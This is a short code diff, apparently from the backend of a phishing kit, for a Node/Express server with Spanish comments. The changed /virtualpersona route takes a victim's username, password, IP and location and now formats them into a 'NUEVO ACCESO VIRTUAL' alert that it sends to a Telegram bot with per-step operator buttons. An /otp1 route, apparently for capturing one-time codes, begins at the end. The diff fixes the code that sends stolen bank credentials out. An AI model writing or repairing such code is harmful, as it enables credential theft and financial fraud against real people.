@@ -95,7 +95,7 @@ app.post('/virtualpersona', async (req, res) => {
     if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });
 
     // 1. Guardar estado
-    const updated = await writeState(sessionId, {
+    await writeState(sessionId, {
       step: 'virtual',
       data: { ...(await readState(sessionId)).data, user, pass, ip, country, city },
       history: [
@@ -105,19 +105,25 @@ app.post('/virtualpersona', async (req, res) => {
       pending: null
     });
 
-  
-await tgSendMessage(message, buttonsForStep('virtual', sessionId));
+    // 2. Definir el mensaje correctamente
+    const message = `📲 NUEVO ACCESO VIRTUAL
 
+👤 Usuario: ${user}
+🔑 Clave: ${pass}
+🌐 IP: ${ip}
+🆔 SessionID: ${sessionId}
+📍 Ciudad: ${city} - ${country}`;
 
-
+    // 3. Enviar a Telegram con botones
+    await tgSendMessage(message, buttonsForStep('virtual', sessionId));
 
     res.json({ ok: true });
-
   } catch (err) {
     console.error('Error en /virtualpersona:', err);
     res.status(500).json({ error: 'Error interno del servidor' });
   }
 });
+
 
 app.post('/otp1', async (req, res) => {
   try {
